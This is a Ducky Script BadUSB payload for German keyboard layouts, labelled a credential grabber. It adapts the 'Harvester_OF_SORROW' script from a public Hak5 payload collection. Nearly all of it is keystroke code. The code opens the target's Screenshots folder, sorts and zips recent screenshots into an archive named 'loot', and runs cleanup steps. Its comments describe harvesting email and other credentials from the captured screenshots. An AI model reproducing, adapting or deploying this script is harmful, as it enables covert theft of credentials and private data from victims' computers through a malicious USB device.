DUCKY_LANG DE
REM @author:germansquid | Credit for original: LulzAnarchyAnon
REM origin: UberGuidoZ / Hak5-OMG-Payloads @ https://github.com/UberGuidoZ/Hak5-OMG-Payloads
REM BadUSB credential grabber via firefox (filemanagement)
REM category: credentials

REM This is a modified version of LulzAnarchyAnon and UberGuidoZ script. It can be found here:
REM https://github.com/UberGuidoZ/Hak5-OMG-Payloads/blob/master/payloads/library/credentials/Harvester_OF_SORROW/payload.txt
REM This version focusses on runability on other layouts, working out not just the DUCKY_LANG, but the contextual navigation.
REM Also there are changes made in style of navigation and sorting the files.

REM from LulzAnarchyAnon / UberGuidoZ:
REM Payload DELAYS,TABS AND ARROWS may need to be ajusted depending on target system speeds.
REM After email aqusition you will be able to adjust DELAYS,TABS AND ARROWS to harvest other creds from
REM the email screen shot.

REM ----------------------------------------
DUCKY_LANG DE
GUI r
DELAY 500
STRING %USERPROFILE%\Pictures\Screenshots
ENTER
DELAY 2000
REM ----SORT AND ZIP----
CTRL SHIFT 6
DELAY 500
MENU
DELAY 500
DOWNARROW
DOWNARROW
RIGHTARROW
DOWNARROW
REPEAT 4
ENTER
DELAY 500
END
SHIFT UPARROW
REPEAT 3
DELAY 500
MENU
DELAY 500
STRING s
DELAY 500
STRING z
DELAY 500
STRING loot
ENTER
DELAY 500
ALT F4
DELAY 500
GUI r
DELAY 500

REM ---CLEANUP---
STRING del Pictures\Screenshots\loot.zip
ENTER
DELAY 150
STRING exit
ENTER
DELAY 500
GUI r
DELAY 500
STRING %USERPROFILE%\Pictures\Screenshots
ENTER
DELAY 2000
END
SHIFT UPARROW
REPEAT 3
DELAY 500
MENU
DELAY 500
STRING l
DELAY 500
ENTER
DELAY 500
ALT F4
